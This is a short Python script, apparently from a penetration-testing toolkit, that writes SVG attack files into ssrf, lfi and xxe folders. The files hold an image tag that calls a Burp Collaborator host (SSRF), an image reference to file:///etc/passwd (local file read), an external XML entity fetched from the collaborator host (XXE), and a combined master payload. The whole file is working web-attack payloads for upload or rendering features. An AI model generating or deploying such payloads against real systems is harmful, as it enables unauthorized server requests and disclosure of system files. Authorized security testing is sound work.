from pathlib import Path

def generate_svg_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    ssrf_dir = output_dir / 'ssrf'
    ssrf_dir.mkdir(exist_ok=True)
    lfi_dir = output_dir / 'lfi'
    lfi_dir.mkdir(exist_ok=True)
    xxe_dir = output_dir / 'xxe'
    xxe_dir.mkdir(exist_ok=True)
    
    svg_ssrf1_image = f'''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<image href="{base_url}/s1" width="100" height="100"/>
</svg>'''
    with open(ssrf_dir / "ssrf1_image.svg", 'w', encoding='utf-8') as f:
        f.write(svg_ssrf1_image)
    
    svg_lfi2_image = f'''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<image href="file:///etc/passwd" width="100" height="100"/>
</svg>'''
    with open(lfi_dir / "lfi2_image_file.svg", 'w', encoding='utf-8') as f:
        f.write(svg_lfi2_image)
    
    svg_xxe3_doctype = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY % x SYSTEM "{base_url}/xxe-svg">%x;]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<rect width="100" height="100" fill="red"/>
</svg>'''
    with open(xxe_dir / "xxe3_doctype.svg", 'w', encoding='utf-8') as f:
        f.write(svg_xxe3_doctype)
    
    svg_master = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY % x SYSTEM "{base_url}/xxe-svg">%x;]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<image href="{base_url}/s1" width="100" height="100"/>
<rect width="100" height="100" fill="red"/>
</svg>'''
    with open(output_dir / "master.svg", 'w', encoding='utf-8') as f:
        f.write(svg_master)
